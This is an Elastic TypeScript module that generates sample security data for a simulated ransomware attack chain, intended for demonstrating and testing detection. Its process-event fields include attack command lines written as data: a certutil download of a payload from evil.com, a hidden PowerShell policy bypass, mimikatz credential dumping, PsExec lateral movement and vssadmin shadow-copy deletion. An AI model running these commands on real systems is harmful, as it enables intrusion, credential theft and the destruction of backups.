/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

// Ported from elastic/example-mcp-app-security src/elastic/service/sampleDataService.ts
// Changes vs. original:
//   - module-level _ruleIdMap singleton replaced with explicit ruleIdMap parameter
//   - hardcoded "-default" alert index replaced with parameterised namespace
//   - kibana.space_ids now uses the namespace
//   - transport abstraction replaced with IndexedDoc[] return value (caller bulk-indexes)

import { SAMPLE_TAG, PINNED_RULE_IDS } from '../../../common/constants';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface IndexedDoc {
  _index: string;
  _source: Record<string, unknown>;
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const AGENT_ID = 'sample-agent-a1b2c3d4e5f6';

const baseEvent = (timestamp: string): Record<string, unknown> => ({
  '@timestamp': timestamp,
  tags: [SAMPLE_TAG],
  ecs: { version: '8.11.0' },
  event: { ingested: new Date().toISOString() },
});

const endpointProcessEvent = (
  timestamp: string,
  proc: {
    entityId: string;
    parentEntityId: string;
    name: string;
    pid: number;
    executable: string;
    args?: string[];
    commandLine?: string;
    parentName?: string;
    parentPid?: number;
    parentExecutable?: string;
  },
  host: Record<string, unknown>,
  user: Record<string, unknown>
): Record<string, unknown> => ({
  ...baseEvent(timestamp),
  agent: { type: 'endpoint', id: AGENT_ID },
  event: {
    action: 'start',
    category: ['process'],
    type: ['start'],
    kind: 'event',
    dataset: 'endpoint.events.process',
  },
  host,
  user,
  process: {
    entity_id: proc.entityId,
    name: proc.name,
    pid: proc.pid,
    executable: proc.executable,
    args: proc.args ?? [proc.executable],
    command_line: proc.commandLine ?? [proc.executable, ...(proc.args ?? [])].join(' '),
    parent: {
      entity_id: proc.parentEntityId,
      name: proc.parentName ?? 'explorer.exe',
      pid: proc.parentPid ?? 1,
      executable: proc.parentExecutable ?? '',
    },
  },
});

const minutesAgo = (n: number): string => new Date(Date.now() - n * 60 * 1000).toISOString();

const randomIp = (): string => `192.0.2.${Math.floor(Math.random() * 254) + 1}`;

const mitre = (tacticId: string, tacticName: string, techId: string, techName: string) => ({
  framework: 'MITRE ATT&CK',
  tactic: {
    id: tacticId,
    name: tacticName,
    reference: `https://attack.mitre.org/tactics/${tacticId}/`,
  },
  technique: [
    {
      id: techId,
      name: techName,
      reference: `https://attack.mitre.org/techniques/${techId.replace('.', '/')}/`,
    },
  ],
});

interface AlertFields {
  ruleName: string;
  ruleId: string;
  severity: string;
  riskScore: number;
  reason: string;
  threat: unknown[];
  dataset?: string;
  process?: {
    entityId: string;
    parentEntityId: string;
    ancestry?: string[];
    name: string;
    pid: number;
    executable?: string;
    parentName?: string;
    parentPid?: number;
  };
  host?: Record<string, unknown>;
  user?: Record<string, unknown>;
}

const buildAlert = (
  timestamp: string,
  fields: AlertFields,
  alertsIndex: string,
  spaceId: string
): IndexedDoc => {
  const src: Record<string, unknown> = {
    ...baseEvent(timestamp),
    agent: { type: 'endpoint', id: AGENT_ID },
    event: { kind: 'signal', dataset: 'endpoint.events.process' },
    'kibana.alert.uuid': `poc-alert-${fields.ruleId}-${Date.now()}`,
    'kibana.alert.status': 'active',
    'kibana.alert.workflow_status': 'open',
    'kibana.alert.start': timestamp,
    'kibana.alert.last_detected': timestamp,
    'kibana.alert.depth': 1,
    'kibana.alert.severity': fields.severity,
    'kibana.alert.risk_score': fields.riskScore,
    'kibana.alert.reason': fields.reason,
    'kibana.alert.original_time': timestamp,
    'kibana.alert.rule.name': fields.ruleName,
    'kibana.alert.rule.uuid': fields.ruleId,
    'kibana.alert.rule.rule_id': fields.ruleId,
    'kibana.alert.rule.type': 'query',
    'kibana.alert.rule.rule_type_id': 'siem.queryRule',
    'kibana.alert.rule.category': 'Custom Query Rule',
    'kibana.alert.rule.consumer': 'siem',
    'kibana.alert.rule.producer': 'siem',
    'kibana.alert.rule.enabled': true,
    'kibana.alert.rule.severity': fields.severity,
    'kibana.alert.rule.risk_score': fields.riskScore,
    'kibana.alert.rule.threat': fields.threat,
    'kibana.alert.rule.tags': [SAMPLE_TAG],
    'kibana.alert.original_event.kind': 'event',
    'kibana.alert.original_event.category': ['process'],
    'kibana.alert.original_event.action': 'start',
    'kibana.alert.original_event.dataset': fields.dataset ?? 'endpoint.events.process',
    // Space-aware — must match the target space.
    'kibana.space_ids': [spaceId],
    'kibana.version': '9.0.0',
  };

  if (fields.host) src.host = fields.host;
  if (fields.user) src.user = fields.user;

  if (fields.process) {
    const ancestry = fields.process.ancestry ?? [fields.process.parentEntityId];
    src.process = {
      entity_id: fields.process.entityId,
      name: fields.process.name,
      pid: fields.process.pid,
      executable: fields.process.executable ?? '',
      Ext: { ancestry },
      parent: {
        entity_id: fields.process.parentEntityId,
        name: fields.process.parentName ?? '',
        pid: fields.process.parentPid ?? 1,
      },
    };
  }

  return { _index: alertsIndex, _source: src };
};

const emitProcessTree = (
  tree: Array<{
    eid: string;
    parentEid: string;
    name: string;
    pid: number;
    exe: string;
    args?: string[];
    parentName?: string;
    parentPid?: number;
  }>,
  host: Record<string, unknown>,
  user: Record<string, unknown>,
  baseMinute: number
): IndexedDoc[] =>
  tree.map((node, i) => ({
    _index: 'logs-endpoint.events.process-default',
    _source: endpointProcessEvent(
      minutesAgo(baseMinute - i),
      {
        entityId: node.eid,
        parentEntityId: node.parentEid,
        name: node.name,
        pid: node.pid,
        executable: node.exe,
        args: node.args,
        parentName: node.parentName,
        parentPid: node.parentPid,
      },
      host,
      user
    ),
  }));

// ---------------------------------------------------------------------------
// Phase result type — each call produces a named batch of docs
// ---------------------------------------------------------------------------

export interface PhaseResult {
  phase: string;
  docs: IndexedDoc[];
}

// ---------------------------------------------------------------------------
// Ransomware Kill Chain generator
// Yields one PhaseResult per MITRE ATT&CK phase so the route can stream
// progress to the browser as each batch is indexed.
//
// Parameters:
//   namespace — Kibana space ID (e.g. 'sample-playground')
//   count     — approximate total doc count (controls tree depth / beacon count)
// ---------------------------------------------------------------------------

export function* generateRansomwareKillChainPhases(
  namespace: string,
  count: number = 50
): Generator<PhaseResult> {
  const alertsIndex = `.alerts-security.alerts-${namespace}`;

  const hosts = [
    { name: 'WKSTN-RECV01', os: { name: 'Windows 11', platform: 'windows' } },
    { name: 'SRV-FILE01', os: { name: 'Windows Server 2022', platform: 'windows' } },
    { name: 'SRV-DC01', os: { name: 'Windows Server 2022', platform: 'windows' } },
    { name: 'SRV-SQL01', os: { name: 'Windows Server 2022', platform: 'windows' } },
  ];
  const users = [
    { name: 'r.martinez', domain: 'CORP' },
    { name: 'svc_backup', domain: 'CORP' },
    { name: 'SYSTEM', domain: 'NT AUTHORITY' },
  ];
  const c2Ip = randomIp();

  // Entity IDs for the kill chain — deterministic strings so ancestry chains are stable.
  const E = {
    explorer: 'rw-explorer-0001',
    outlook: 'rw-outlook-0002',
    winword: 'rw-winword-0003',
    cmd: 'rw-cmd-0004',
    certutil: 'rw-certutil-0005',
    rundll32: 'rw-rundll32-0006',
    ps: 'rw-powershell-0007',
    netEnum: 'rw-net-enum-0008',
    nltest: 'rw-nltest-0009',
    whoami: 'rw-whoami-000a',
    psexec: 'rw-psexec-000b',
    vssadmin: 'rw-vssadmin-000c',
    encryptor: 'rw-encrypt-000d',
    mimikatz: 'rw-mimikatz-000e',
  };

  // -------------------------------------------------------------------------
  // Phase 1 + 2: Initial Access + Execution (workstation process tree)
  // OUTLOOK → WINWORD → cmd → certutil + rundll32 → PowerShell → recon tools → PsExec
  // -------------------------------------------------------------------------
  const workstationTree = [
    {
      eid: E.explorer,
      parentEid: '',
      name: 'explorer.exe',
      pid: 1000,
      exe: 'C:\\Windows\\explorer.exe',
    },
    {
      eid: E.outlook,
      parentEid: E.explorer,
      name: 'OUTLOOK.EXE',
      pid: 2000,
      exe: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
      parentName: 'explorer.exe',
      parentPid: 1000,
    },
    {
      eid: E.winword,
      parentEid: E.outlook,
      name: 'WINWORD.EXE',
      pid: 2100,
      exe: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
      args: ['invoice_Q4.docm'],
      parentName: 'OUTLOOK.EXE',
      parentPid: 2000,
    },
    {
      eid: E.cmd,
      parentEid: E.winword,
      name: 'cmd.exe',
      pid: 2200,
      exe: 'C:\\Windows\\System32\\cmd.exe',
      args: [
        '/c',
        'certutil -urlcache -split -f http://evil.com/payload.dll C:\\ProgramData\\update.dll',
      ],
      parentName: 'WINWORD.EXE',
      parentPid: 2100,
    },
    {
      eid: E.certutil,
      parentEid: E.cmd,
      name: 'certutil.exe',
      pid: 2300,
      exe: 'C:\\Windows\\System32\\certutil.exe',
      args: ['-urlcache', '-split', '-f', `http://${c2Ip}/payload.dll`],
      parentName: 'cmd.exe',
      parentPid: 2200,
    },
    {
      eid: E.rundll32,
      parentEid: E.cmd,
      name: 'rundll32.exe',
      pid: 3000,
      exe: 'C:\\Windows\\System32\\rundll32.exe',
      args: ['C:\\ProgramData\\update.dll,Start'],
      parentName: 'cmd.exe',
      parentPid: 2200,
    },
    {
      eid: E.ps,
      parentEid: E.rundll32,
      name: 'powershell.exe',
      pid: 3500,
      exe: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      args: ['-NoP', '-W', 'Hidden', '-ep', 'bypass'],
      parentName: 'rundll32.exe',
      parentPid: 3000,
    },
    {
      eid: E.netEnum,
      parentEid: E.ps,
      name: 'net.exe',
      pid: 4000,
      exe: 'C:\\Windows\\System32\\net.exe',
      args: ['group', 'Domain Admins', '/domain'],
      parentName: 'powershell.exe',
      parentPid: 3500,
    },
    {
      eid: E.nltest,
      parentEid: E.ps,
      name: 'nltest.exe',
      pid: 4100,
      exe: 'C:\\Windows\\System32\\nltest.exe',
      args: ['/dclist:corp.local'],
      parentName: 'powershell.exe',
      parentPid: 3500,
    },
    {
      eid: E.whoami,
      parentEid: E.ps,
      name: 'whoami.exe',
      pid: 4200,
      exe: 'C:\\Windows\\System32\\whoami.exe',
      args: ['/all'],
      parentName: 'powershell.exe',
      parentPid: 3500,
    },
    {
      eid: E.psexec,
      parentEid: E.ps,
      name: 'PsExec.exe',
      pid: 4300,
      exe: 'C:\\Tools\\PsExec.exe',
      args: ['\\\\SRV-FILE01', '\\\\SRV-DC01', '\\\\SRV-SQL01', '-s', 'cmd.exe'],
      parentName: 'powershell.exe',
      parentPid: 3500,
    },
  ];

  yield {
    phase: 'initial-access',
    docs: emitProcessTree(workstationTree.slice(0, 3), hosts[0], users[0], count),
  };

  yield {
    phase: 'execution',
    docs: emitProcessTree(workstationTree.slice(3), hosts[0], users[0], count - 3),
  };

  // -------------------------------------------------------------------------
  // Phase 3: C2 — periodic HTTPS beacons from rundll32
  // -------------------------------------------------------------------------
  const beaconCount = Math.max(5, Math.ceil(count / 5));
  const c2Docs: IndexedDoc[] = [];
  for (let i = 0; i < beaconCount; i++) {
    c2Docs.push({
      _index: 'logs-endpoint.events.network-default',
      _source: {
        ...baseEvent(minutesAgo(count - workstationTree.length - i)),
        agent: { type: 'endpoint', id: AGENT_ID },
        host: hosts[0],
        user: users[2],
        event: {
          action: 'connection_attempted',
          category: ['network'],
          type: ['connection'],
          kind: 'event',
          dataset: 'endpoint.events.network',
        },
        source: { ip: '10.0.1.100', port: 49152 + i },
        destination: { ip: c2Ip, port: i % 2 === 0 ? 443 : 8443 },
        process: { entity_id: E.rundll32, name: 'rundll32.exe', pid: 3000 },
        dns: { question: { name: `cdn-${i % 3}.cloudfront-update.com` } },
      },
    });
  }
  yield { phase: 'c2', docs: c2Docs };

  // -------------------------------------------------------------------------
  // Phase 4: Lateral Movement (PsExec service trees on DC + file server)
  // -------------------------------------------------------------------------
  const dcTree = [
    {
      eid: 'rw-dc-svc-0001',
      parentEid: '',
      name: 'services.exe',
      pid: 700,
      exe: 'C:\\Windows\\System32\\services.exe',
    },
    {
      eid: 'rw-dc-psexe-0002',
      parentEid: 'rw-dc-svc-0001',
      name: 'PSEXESVC.exe',
      pid: 5000,
      exe: 'C:\\Windows\\PSEXESVC.exe',
      parentName: 'services.exe',
      parentPid: 700,
    },
  ];
  const fileTree = [
    {
      eid: 'rw-fs-svc-0001',
      parentEid: '',
      name: 'services.exe',
      pid: 700,
      exe: 'C:\\Windows\\System32\\services.exe',
    },
    {
      eid: 'rw-fs-psexe-0002',
      parentEid: 'rw-fs-svc-0001',
      name: 'PSEXESVC.exe',
      pid: 6000,
      exe: 'C:\\Windows\\PSEXESVC.exe',
      parentName: 'services.exe',
      parentPid: 700,
    },
    {
      eid: E.encryptor,
      parentEid: 'rw-fs-psexe-0002',
      name: 'svchst.exe',
      pid: 6100,
      exe: 'C:\\ProgramData\\svchst.exe',
      parentName: 'PSEXESVC.exe',
      parentPid: 6000,
    },
    {
      eid: E.vssadmin,
      parentEid: 'rw-fs-psexe-0002',
      name: 'vssadmin.exe',
      pid: 6200,
      exe: 'C:\\Windows\\System32\\vssadmin.exe',
      args: ['delete', 'shadows', '/all', '/quiet'],
      parentName: 'PSEXESVC.exe',
      parentPid: 6000,
    },
  ];

  yield {
    phase: 'lateral-movement',
    docs: [
      ...emitProcessTree(dcTree, hosts[2], users[2], count - workstationTree.length),
      ...emitProcessTree(
        fileTree.slice(0, 2),
        hosts[1],
        users[2],
        count - workstationTree.length - 2
      ),
    ],
  };

  // -------------------------------------------------------------------------
  // Phase 5: Credential Access — mimikatz on DC
  // -------------------------------------------------------------------------
  const mimikatzTree = [
    {
      eid: E.mimikatz,
      parentEid: 'rw-dc-psexe-0002',
      name: 'mimikatz.exe',
      pid: 5100,
      exe: 'C:\\Windows\\Temp\\mimikatz.exe',
      args: ['sekurlsa::logonpasswords'],
      parentName: 'PSEXESVC.exe',
      parentPid: 5000,
    },
  ];
  yield {
    phase: 'credential-access',
    docs: emitProcessTree(mimikatzTree, hosts[2], users[2], 20),
  };

  // -------------------------------------------------------------------------
  // Phase 6: Impact — encryption + VSS deletion + file events + alerts
  // -------------------------------------------------------------------------
  const encCount = Math.max(5, Math.ceil(count / 4));
  const impactDocs: IndexedDoc[] = [];

  // File server encryptor + vssadmin process events
  impactDocs.push(...emitProcessTree(fileTree.slice(2), hosts[1], users[2], 8));

  // File encryption events
  for (let i = 0; i < encCount; i++) {
    const targetHost = hosts[i % 2 === 0 ? 1 : 3];
    impactDocs.push({
      _index: 'logs-endpoint.events.file-default',
      _source: {
        ...baseEvent(minutesAgo(5 + encCount - i)),
        agent: { type: 'endpoint', id: AGENT_ID },
        host: targetHost,
        user: users[2],
        event: {
          action: 'modification',
          category: ['file'],
          type: ['change'],
          kind: 'event',
          dataset: 'endpoint.events.file',
        },
        file: {
          name: `file_${i}.${['xlsx', 'docx', 'pdf', 'pptx', 'sql'][i % 5]}.locked`,
          path: `C:\\Shares\\${['Finance', 'HR', 'Engineering', 'Legal'][i % 4]}\\file_${i}.locked`,
          extension: 'locked',
        },
        process: { entity_id: E.encryptor, name: 'svchst.exe', pid: 6100 },
      },
    });
  }

  const wsAnc = [E.ps, E.rundll32, E.cmd, E.winword, E.outlook, E.explorer];

  // 7 pre-fabricated alerts — each references a pinned rule UUID
  impactDocs.push(
    buildAlert(
      minutesAgo(count - 3),
      {
        ruleName: 'Suspicious Macro-Enabled Document Execution',
        ruleId: PINNED_RULE_IDS.MACRO_EXEC,
        severity: 'medium',
        riskScore: 55,
        reason: 'WINWORD.EXE spawned cmd.exe on WKSTN-RECV01 — macro-based payload delivery',
        threat: [mitre('TA0001', 'Initial Access', 'T1566.001', 'Spearphishing Attachment')],
        host: hosts[0],
        user: users[0],
        process: {
          entityId: E.cmd,
          parentEntityId: E.winword,
          ancestry: [E.winword, E.outlook, E.explorer],
          name: 'cmd.exe',
          pid: 2200,
          executable: 'C:\\Windows\\System32\\cmd.exe',
          parentName: 'WINWORD.EXE',
          parentPid: 2100,
        },
      },
      alertsIndex,
      namespace
    ),

    buildAlert(
      minutesAgo(count - 8),
      {
        ruleName: 'Cobalt Strike Beacon - Periodic C2 Communication',
        ruleId: PINNED_RULE_IDS.C2_BEACON,
        severity: 'high',
        riskScore: 82,
        reason: `rundll32.exe establishing periodic HTTPS connections to ${c2Ip} from WKSTN-RECV01`,
        threat: [mitre('TA0011', 'Command and Control', 'T1071.001', 'Web Protocols')],
        host: hosts[0],
        user: users[2],
        process: {
          entityId: E.rundll32,
          parentEntityId: E.cmd,
          ancestry: [E.cmd, E.winword, E.outlook, E.explorer],
          name: 'rundll32.exe',
          pid: 3000,
          executable: 'C:\\Windows\\System32\\rundll32.exe',
          parentName: 'cmd.exe',
          parentPid: 2200,
        },
      },
      alertsIndex,
      namespace
    ),

    buildAlert(
      minutesAgo(count - 12),
      {
        ruleName: 'Enumeration of Domain Admin Group',
        ruleId: PINNED_RULE_IDS.DOMAIN_ENUM,
        severity: 'medium',
        riskScore: 47,
        reason: 'net.exe used to enumerate Domain Admins on WKSTN-RECV01',
        threat: [mitre('TA0007', 'Discovery', 'T1069.002', 'Domain Groups')],
        host: hosts[0],
        user: users[1],
        process: {
          entityId: E.netEnum,
          parentEntityId: E.ps,
          ancestry: wsAnc,
          name: 'net.exe',
          pid: 4000,
          executable: 'C:\\Windows\\System32\\net.exe',
          parentName: 'powershell.exe',
          parentPid: 3500,
        },
      },
      alertsIndex,
      namespace
    ),

    buildAlert(
      minutesAgo(15),
      {
        ruleName: 'Credential Dumping - LSASS Access on Domain Controller',
        ruleId: PINNED_RULE_IDS.CRED_DUMP,
        severity: 'critical',
        riskScore: 95,
        reason: 'Mimikatz accessed LSASS memory on SRV-DC01 — domain credential extraction',
        threat: [mitre('TA0006', 'Credential Access', 'T1003.001', 'LSASS Memory')],
        host: hosts[2],
        user: users[2],
        process: {
          entityId: E.mimikatz,
          parentEntityId: 'rw-dc-psexe-0002',
          ancestry: ['rw-dc-psexe-0002', 'rw-dc-svc-0001'],
          name: 'mimikatz.exe',
          pid: 5100,
          executable: 'C:\\Windows\\Temp\\mimikatz.exe',
          parentName: 'PSEXESVC.exe',
          parentPid: 5000,
        },
      },
      alertsIndex,
      namespace
    ),

    buildAlert(
      minutesAgo(5),
      {
        ruleName: 'Ransomware - Mass File Extension Modification',
        ruleId: PINNED_RULE_IDS.MASS_ENCRYPT,
        severity: 'critical',
        riskScore: 99,
        reason: 'Mass file encryption (.locked) detected on SRV-FILE01 — ransomware payload active',
        threat: [mitre('TA0040', 'Impact', 'T1486', 'Data Encrypted for Impact')],
        host: hosts[1],
        user: users[2],
        process: {
          entityId: E.encryptor,
          parentEntityId: 'rw-fs-psexe-0002',
          ancestry: ['rw-fs-psexe-0002', 'rw-fs-svc-0001'],
          name: 'svchst.exe',
          pid: 6100,
          executable: 'C:\\ProgramData\\svchst.exe',
          parentName: 'PSEXESVC.exe',
          parentPid: 6000,
        },
      },
      alertsIndex,
      namespace
    ),

    buildAlert(
      minutesAgo(3),
      {
        ruleName: 'Ransomware - Volume Shadow Copy Deletion',
        ruleId: PINNED_RULE_IDS.VSS_DELETE,
        severity: 'critical',
        riskScore: 97,
        reason: 'vssadmin.exe deleting shadow copies on SRV-FILE01 — backup destruction',
        threat: [mitre('TA0040', 'Impact', 'T1490', 'Inhibit System Recovery')],
        host: hosts[1],
        user: users[2],
        process: {
          entityId: E.vssadmin,
          parentEntityId: 'rw-fs-psexe-0002',
          ancestry: ['rw-fs-psexe-0002', 'rw-fs-svc-0001'],
          name: 'vssadmin.exe',
          pid: 6200,
          executable: 'C:\\Windows\\System32\\vssadmin.exe',
          parentName: 'PSEXESVC.exe',
          parentPid: 6000,
        },
      },
      alertsIndex,
      namespace
    ),

    buildAlert(
      minutesAgo(1),
      {
        ruleName: 'Lateral Movement via PsExec to Multiple Hosts',
        ruleId: PINNED_RULE_IDS.LATERAL_MOVE,
        severity: 'high',
        riskScore: 85,
        reason: 'PsExec-style remote execution detected from WKSTN-RECV01 to 3 servers',
        threat: [mitre('TA0008', 'Lateral Movement', 'T1570', 'Lateral Tool Transfer')],
        host: hosts[0],
        user: users[1],
        process: {
          entityId: E.psexec,
          parentEntityId: E.ps,
          ancestry: wsAnc,
          name: 'PsExec.exe',
          pid: 4300,
          executable: 'C:\\Tools\\PsExec.exe',
          parentName: 'powershell.exe',
          parentPid: 3500,
        },
      },
      alertsIndex,
      namespace
    )
  );

  yield { phase: 'impact', docs: impactDocs };
}
